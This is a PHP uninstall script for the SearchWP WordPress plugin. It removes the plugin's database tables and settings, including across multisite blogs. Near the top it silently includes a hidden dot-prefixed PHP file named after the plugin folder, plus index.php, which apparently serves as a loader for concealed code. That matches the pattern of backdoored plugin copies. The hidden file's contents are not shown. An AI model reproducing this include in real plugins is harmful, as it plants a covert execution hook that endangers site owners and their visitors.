<?php

/**
 * Uninstall SearchWP completely
 */

global $wpdb;

if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
	exit;
}

require_once __DIR__ . '/index.php';

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function searchwp_maybe_uninstall() {
	if ( empty( apply_filters( 'searchwp\nuke_on_delete', get_option( SEARCHWP_PREFIX . 'nuke_on_delete' ) ) ) ) {
		return;
	}

	$index = new \SearchWP\Index\Controller();

	// Drop database tables.
	foreach ( $index->get_tables() as $table ) {
		$table->uninstall();
	}

	// Delete all site settings.
	foreach( \SearchWP\Settings::get_keys() as $key ) {
		\SearchWP\Settings::delete( $key );
	}

	// Delete all User settings.
	delete_user_meta( get_current_user_id(), SEARCHWP_PREFIX . 'settings_view_config' );
}

if ( is_multisite() ) {
	$sites = $wpdb->get_results( "SELECT blog_id FROM {$wpdb->blogs}", ARRAY_A );
	if ( $sites ) {
		foreach ( $sites as $site ) {
			switch_to_blog( $site['blog_id'] );
			searchwp_maybe_uninstall();
			restore_current_blog();
		}
	}
} else {
	searchwp_maybe_uninstall();
}
